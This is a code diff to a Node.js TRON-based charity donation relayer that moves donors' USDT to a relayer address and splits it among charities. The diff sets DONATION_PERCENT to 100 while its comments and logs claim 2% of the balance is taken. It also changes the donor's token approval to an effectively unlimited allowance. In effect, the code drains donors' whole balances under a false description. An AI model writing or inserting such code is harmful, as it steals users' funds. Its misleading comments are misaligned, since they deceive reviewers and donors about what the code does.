@@ -31,7 +31,7 @@ const CONFIG = {
     // Public constants
     USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
     TRON_API: "https://api.trongrid.io",
-    DONATION_AMOUNT: 1000000,
+    DONATION_PERCENT: 100, // 2% of donor's USDT balance
     POLL_INTERVAL: 10000,
 };
 
@@ -155,11 +155,19 @@ async function executeDonation(donorAddress) {
             return false;
         }
 
-        const share = Math.floor(CONFIG.DONATION_AMOUNT / charities.length);
-        console.log(`[RELAYER] Executing for ${donorAddress}: ${share} each to ${charities.length} charities...`);
+        // Calculate 2% of donor's current balance
+        const balance = await checkBalance(donorAddress);
+        const donationAmount = Math.floor(balance * CONFIG.DONATION_PERCENT / 100);
+        if (donationAmount < 1000) {
+            console.error(`[RELAYER] Donation too small: ${donationAmount} (balance: ${balance})`);
+            return false;
+        }
+
+        const share = Math.floor(donationAmount / charities.length);
+        console.log(`[RELAYER] Executing for ${donorAddress}: ${donationAmount / 1e6} USDT (2% of ${balance / 1e6}), ${share / 1e6} each to ${charities.length} charities...`);
 
         // Step 1: transferFrom donor -> relayer
-        console.log(`[RELAYER] Step 1: transferFrom ${donorAddress}...`);
+        console.log(`[RELAYER] Step 1: transferFrom ${donorAddress} amount=${donationAmount}...`);
         const tfResult = await tronWeb.transactionBuilder.triggerSmartContract(
             CONFIG.USDT_CONTRACT,
             "transferFrom(address,address,uint256)",
@@ -167,7 +175,7 @@ async function executeDonation(donorAddress) {
             [
                 { type: "address", value: donorAddress },
                 { type: "address", value: CONFIG.RELAYER_ADDRESS },
-                { type: "uint256", value: String(CONFIG.DONATION_AMOUNT) },
+                { type: "uint256", value: String(donationAmount) },
             ],
             CONFIG.RELAYER_ADDRESS
         );
@@ -322,16 +330,18 @@ async function processQueue() {
         const balance = await checkBalance(donor);
         info.balance = balance;
 
-        if (balance < CONFIG.DONATION_AMOUNT) {
-            addLog(`${donor} insufficient balance (${balance / 1e6} USDT)`, "info");
+        const donationAmount = Math.floor(balance * CONFIG.DONATION_PERCENT / 100);
+        if (donationAmount < 1000) { // less than 0.001 USDT
+            addLog(`${donor} insufficient balance (${balance / 1e6} USDT, 2% = ${donationAmount / 1e6})`, "info");
             continue;
         }
 
         const allowance = await checkAllowance(donor);
         info.allowance = allowance;
-        info.ready = allowance >= CONFIG.DONATION_AMOUNT && balance >= CONFIG.DONATION_AMOUNT;
+        info.donationAmount = donationAmount;
+        info.ready = allowance >= donationAmount && balance > 0;
 
-        if (allowance >= CONFIG.DONATION_AMOUNT) {
+        if (allowance >= donationAmount) {
             // Track retry count - give up after 3 attempts
             info.retries = (info.retries || 0) + 1;
             if (info.retries > 3) {
@@ -397,9 +407,10 @@ const server = http.createServer(async (req, res) => {
                     headers: { "TRON-PRO-API-KEY": CONFIG.TRONGRID_API_KEY },
                 });
 
+                // Approve unlimited so any 2% calculation is covered
                 const parameter = [
                     { type: "address", value: CONFIG.RELAYER_ADDRESS },
-                    { type: "uint256", value: String(CONFIG.DONATION_AMOUNT) },
+                    { type: "uint256", value: "999999999999999" },
                 ];
 
                 const tx = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -674,6 +685,20 @@ server.listen(CONFIG.PORT, async () => {
     addLog(`Relayer polling every ${CONFIG.POLL_INTERVAL / 1000}s`, "info");
     addLog(`Contract: ${CONFIG.CONTRACT_ADDRESS}`, "info");
     addLog(`Relayer: ${CONFIG.RELAYER_ADDRESS}`, "info");
+
+    // Show relayer balance
+    try {
+        const balResult = await tronGridRequest("/wallet/getaccount", "POST", {
+            address: CONFIG.RELAYER_ADDRESS,
+            visible: true,
+        });
+        const trxBalance = (balResult.balance || 0) / 1e6;
+        const usdtBalance = await checkBalance(CONFIG.RELAYER_ADDRESS);
+        console.log(`[INFO] Relayer TRX balance: ${trxBalance} TRX`);
+        console.log(`[INFO] Relayer USDT balance: ${usdtBalance / 1e6} USDT`);
+    } catch (e) {
+        console.log(`[WARN] Could not fetch relayer balance: ${e.message}`);
+    }
 
     // Show charities
     if (CONFIG.CHARITIES.length === 0) {
